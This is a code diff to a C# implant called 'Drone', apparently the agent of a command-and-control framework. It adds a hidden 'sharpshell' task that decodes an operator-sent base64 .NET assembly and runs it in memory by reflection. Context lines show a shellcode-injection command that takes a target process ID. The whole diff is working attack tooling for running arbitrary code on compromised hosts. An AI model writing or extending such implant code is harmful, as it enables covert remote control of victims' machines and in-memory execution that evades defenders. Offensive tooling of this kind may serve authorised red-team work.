@@ -85,7 +85,8 @@ namespace Drone
             {
                 new("/path/to/shellcode.bin", false, true),
                 new("pid", false)
-            })
+            }),
+            new("sharpshell", "", ExecuteSharpShell, visible: false)
         };
 
         private void GetCurrentDirectory(DroneTask task, CancellationToken token)
@@ -177,7 +178,7 @@ namespace Drone
         private void ExecuteAssembly(DroneTask task, CancellationToken token)
         {
             var asm = Convert.FromBase64String(task.Artefact);
-            var result = Assembly.Execute(asm, task.Arguments);
+            var result = Assembly.AssemblyExecute(asm, task.Arguments);
 
             Drone.SendResult(task.TaskGuid, result);
         }
@@ -278,6 +279,14 @@ namespace Drone
             }
             
             Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
+        }
+
+        private void ExecuteSharpShell(DroneTask task, CancellationToken token)
+        {
+            var asm = Convert.FromBase64String(task.Artefact);
+            var result = Assembly.AssemblyReflect(asm, task.Arguments[0], task.Arguments[1]);
+            
+            Drone.SendResult(task.TaskGuid, result);
         }
         
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
